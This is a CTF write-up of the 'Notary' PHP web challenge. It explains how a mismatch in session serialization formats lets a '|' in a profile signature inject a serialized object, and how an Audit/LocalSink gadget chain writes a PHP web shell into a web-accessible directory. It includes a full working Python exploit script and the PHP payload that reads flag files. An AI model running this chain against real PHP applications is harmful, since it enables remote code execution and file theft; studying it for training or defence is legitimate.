---
title: "notary Write-Up"
date: 2026-09-30
categories: ["CTF", "Write-Up"]
tags: ["CTF", "Web", "PHP", "Session", "Deserialization"]
summary: "A write-up of notary from the Web category of HSPACE's 2026 Space War"
---

## Intro

Hi!

Today, I'm going to walk through **Notary**, a challenge from the Web category of Space War, hosted by HSPACE. It's a small PHP service where you can create documents and add a signature to your profile. As it turned out, the part to watch was **how that signature was stored in the session**, rather than the document itself.

There was no local source code provided, so I had to work backward from the HTTP responses. <br>The gadget wasn't visible from the start, and I remember having a pretty hard time working through it one step at a time.

Let's take a look at the challenge!
<br> <br>

---

## 00_Challenge Description

```json
{
  "Title": "Notary",
  "Description": "Store documents and read them back. Your profile carries a signature line."
}
```

After signing up, you can create a document and save a signature in the `sig` field of your profile. When you view a document, the browser also requests `hit.php?id=<document ID>` as a 1×1 GIF.

The signature appeared on the page, so I first suspected XSS. But the output was HTML-escaped, and ordinary tags didn't execute. What caught my attention instead was that **the session became invalid and the signature disappeared right after I called `hit.php` with a valid document ID**.
<br> <br>

---

## 01_Analyzing the Service

### 01-1_Viewing a Document Affects the Session

These were the main routes I found:

```text
POST /register.php            Create an account
POST /new.php                 Create a document
POST /profile.php             Save the signature (sig)
GET  /doc.php?id=<12 hex>     View a document
GET  /hit.php?id=<12 hex>     Return a 1×1 GIF
```

After noticing that the document page called `hit.php` automatically, I created a document with a new account and called that route on its own. It returned a normal GIF, but when I went back to my profile, I was no longer logged in. That made me think this seemingly simple view request was reading or rewriting the same session file.

I also found that the `|` character was preserved in the signature! <br>For reference, PHP's default session serialization format uses this character as the **delimiter between a variable name and its serialized value**.

<br>

### 01-2_Different Session Serialization Formats

PHP sessions can use different serialization formats, including `php_serialize` and the default `php` format. In simplified form, they look like this:

```text
php_serialize : a:2:{s:1:"u";...s:3:"sig";s:N:"signature value";}
php           : u|serialized valuesig|serialized value
```

<br>
From my tests, I concluded that the regular pages stored the session in `php_serialize` format, while `hit.php` read the same file using the default `php` format. I couldn't inspect the actual configuration line because I didn't have the source, but I did confirm that the delimiter and object placed in the signature were interpreted.

For example, I could save this as the signature:

```text
x|O:5:"Audit":0:{}
```
<br>

On the regular pages, this is just a string in `sig`. But when `hit.php` reads the session file as `php`, it can treat the first `|` inside that string as a delimiter and deserialize the following `O:5:"Audit":0:{}` as a PHP object. The bytes before the delimiter are interpreted as the session variable name.

As a check, I put a `SplFileObject` object in the signature, and `hit.php` returned a 500 response. An ordinary signature didn't produce that response, which confirmed that the serialized object data inside the signature was reaching the processing path!
<br> <br>

---

## 02_Exploit Ideation

Even if I could inject an object, it wouldn't help much without a useful class on the server. <br>This was the part I struggled with for a while.

I tried several property names that sounded like they might let me write a PHP file, but got nowhere. Later, I used the differences produced when the session was serialized again to inspect the remote class properties. That showed me that `Audit` had `sink` and `lines`. I confirmed `dir` and `name` on `LocalSink` the same way.

Here's the object structure I ended up using:

```text
Audit
├─ sink  → LocalSink
│           ├─ dir  = /var/www/html/cache
│           └─ name = <random name>.php
└─ lines → ["<?php ... ?>"]
```
<br>

I made the `Audit` object write its `lines` through the `sink` when the request ended, and pointed `LocalSink` at the web-accessible `cache` directory. With a `.php` filename, I could then request the written file over HTTP and execute its contents.

The beginning of the actual payload looked like this:

```text
x|O:5:"Audit":2:{s:4:"sink";O:9:"LocalSink":2:{...}s:5:"lines";a:1:{...}}
```
<br>

`O:5` and `O:9` specify the byte lengths of the class names. PHP serialized strings also require **byte lengths**, not character counts, so the exploit calculates them with `len(value.encode())`.
<br> <br>

---

## 03_Exploit

I carried out the attack in this order:

```text
1. Create an account and a document to get a valid 12-character document ID.
2. Save x| followed by the serialized Audit → LocalSink object as the profile signature.
3. Call hit.php?id=<document ID> with the same session.
4. Request /cache/<random name>.php and read the execution result.
```
<br>

I created the document first so that `hit.php` would follow its normal processing path for a valid document. Even if the session broke after calling `hit.php`, I could still access the cache file with a fresh HTTP client once it had been written.

Here is the final exploit code. You can pass the target address as an argument.

<details>
<summary>Exploit Code</summary>

```python
#!/usr/bin/env python3
import http.cookiejar
import re
import secrets
import sys
import urllib.error
import urllib.parse
import urllib.request

DEFAULT_BASE = "http://43.200.202.150:8001"


def php_string(value: str) -> str:
    return f's:{len(value.encode())}:"{value}";'


def pop_payload(filename: str, php_code: str) -> str:
    sink = (
        'O:9:"LocalSink":2:{'
        's:3:"dir";'
        + php_string("/var/www/html/cache")
        + 's:4:"name";'
        + php_string(filename)
        + "}"
    )
    audit = (
        'O:5:"Audit":2:{'
        's:4:"sink";'
        + sink
        + 's:5:"lines";a:1:{i:0;'
        + php_string(php_code)
        + "}}"
    )

    return "x|" + audit


def client():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def request(web, base: str, path: str, fields=None):
    data = None
    if fields is not None:
        data = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(base.rstrip("/") + path, data=data)
    try:
        return web.open(req, timeout=15)
    except urllib.error.HTTPError as error:
        return error


def main():
    base = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_BASE
    web = client()
    username = "exp" + secrets.token_hex(5)
    password = "P" + secrets.token_hex(8)

    registered = request(
        web,
        base,
        "/register.php",
        {"u": username, "p": password},
    )
    registered.read()
    if registered.getcode() != 200:
        raise RuntimeError("registration failed")

    created = request(
        web,
        base,
        "/new.php",
        {"title": "exploit trigger", "body": "trigger"},
    )
    created.read()
    match = re.search(r"id=([0-9a-f]{12})", created.geturl())
    if not match:
        raise RuntimeError("could not obtain document id")
    doc_id = match.group(1)

    token = secrets.token_hex(8)
    filename = token + ".php"
    php_code = (
        "<?php foreach(glob('/flag*')?:[] as $f){"
        "echo $f,':',file_get_contents($f),PHP_EOL;} ?>"
    )
    signature = pop_payload(filename, php_code)

    saved = request(web, base, "/profile.php", {"sig": signature})
    saved_body = saved.read()
    if saved.getcode() != 200 or b"saved" not in saved_body.lower():
        raise RuntimeError("profile payload was not saved")

    triggered = request(web, base, "/hit.php?id=" + doc_id)
    triggered.read()
    if triggered.getcode() != 200:
        raise RuntimeError(f"trigger failed with HTTP {triggered.getcode()}")

    result = request(client(), base, "/cache/" + filename)
    output = result.read().decode("utf-8", "replace")
    if result.getcode() != 200:
        raise RuntimeError(f"web shell fetch failed with HTTP {result.getcode()}")

    print(output, end="" if output.endswith("\n") else "\n")
    flags = re.findall(r"[A-Za-z][A-Za-z0-9_]*\{[^\r\n}]+\}", output)
    if not flags:
        raise RuntimeError("no flag-shaped value in remote output")
    print("FLAG=" + flags[-1])


if __name__ == "__main__":
    main()
```

</details>
<br>

The PHP file contained code to read and print files matching `/flag*`. On the remote server, I got this response:

```text
/flag_31b8c6a0d5e7.txt:hspace{bd6ea44a078e208db33c4d90d3fded4f04aaec87e2238168a06041fee02ab471}
```
<br> <br>

---

## 04_Outro

At first, I kept looking at where the signature appeared on the page and chasing XSS. <br>But this challenge made me realize that the important part was **the path that read the session file containing that signature in a different format**, not the rendered page.

It was interesting that a single `|` could lead to object deserialization, but what I remember most is figuring out the structure of `Audit` and `LocalSink` without the source!

That's it for today's write-up!

Thanks for reading 🤭
